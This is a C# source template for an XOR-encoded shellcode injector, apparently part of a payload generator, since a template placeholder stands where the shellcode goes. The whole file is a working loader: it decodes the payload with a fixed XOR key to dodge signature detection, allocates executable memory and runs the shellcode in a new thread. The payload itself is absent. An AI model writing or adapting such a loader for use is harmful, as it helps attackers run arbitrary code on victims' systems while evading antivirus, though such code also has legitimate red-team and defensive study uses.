using System;
using System.Runtime.InteropServices;

namespace XorInjector
{
    public class Program
    {
        // P/Invoke declarations
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        const uint MEM_COMMIT = 0x00001000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        public static void Main(string[] args)
        {
            // XOR-encoded shellcode (key: 0xfa)
            {{ csharp_payload | indent(12) }}

            Console.WriteLine($"[*] Encoded payload size: {buf.Length} bytes");

            // Decode the XOR payload (key: 0xfa)
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            Console.WriteLine("[+] Payload decoded successfully");

            // Allocate RWX memory
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate memory!");
                return;
            }
            Console.WriteLine($"[+] Allocated memory at: 0x{addr.ToInt64():X}");

            // Copy shellcode to allocated memory
            Marshal.Copy(buf, 0, addr, buf.Length);
            Console.WriteLine("[+] Shellcode copied to memory");

            // Execute shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create thread!");
                return;
            }

            Console.WriteLine("[+] Shellcode thread created!");
            Console.WriteLine("[+] Executing payload...");

            // Wait for thread to complete
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
